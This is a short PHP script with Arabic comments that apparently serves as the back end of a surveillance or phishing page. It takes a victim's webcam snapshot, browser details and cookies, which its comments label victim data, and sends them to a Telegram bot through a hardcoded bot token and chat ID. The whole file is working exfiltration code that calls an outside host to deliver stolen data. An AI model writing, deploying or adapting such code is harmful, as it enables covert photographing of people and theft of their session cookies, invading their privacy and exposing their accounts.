<?php
// إعدادات البوت
$botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
$chatId = "8504751121";

// 1. استقبال البيانات وتجهيزها
$imgData = isset($_POST['img']) ? $_POST['img'] : null;
$infoData = isset($_POST['info']) ? $_POST['info'] : "N/A";
$cookieData = isset($_POST['cookies']) ? $_POST['cookies'] : "N/A";

// 2. إرسال المعلومات النصية (المتصفح والكوكيز)
$text = "بيانات الضحية:\n" . $infoData . "\n\nالكوكيز:\n" . $cookieData;
file_get_contents("https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($text));

// 3. معالجة الصورة وإرسالها
if ($imgData) {
    // إزالة جزء الـ header الخاص بالـ base64
    $filteredData = substr($imgData, strpos($imgData, ",")+1);
    $binaryData = base64_decode($filteredData);
    $fileName = 'cam_' . time() . '.jpg';
    
    // حفظ الملف مؤقتاً
    file_put_contents($fileName, $binaryData);

    // إرسال الصورة باستخدام CURL
    $urlPhoto = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($fileName))
    ];
    
    $ch = curl_init($urlPhoto);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // حذف الملف بعد الإرسال
    if (file_exists($fileName)) {
        unlink($fileName);
    }
}
?>
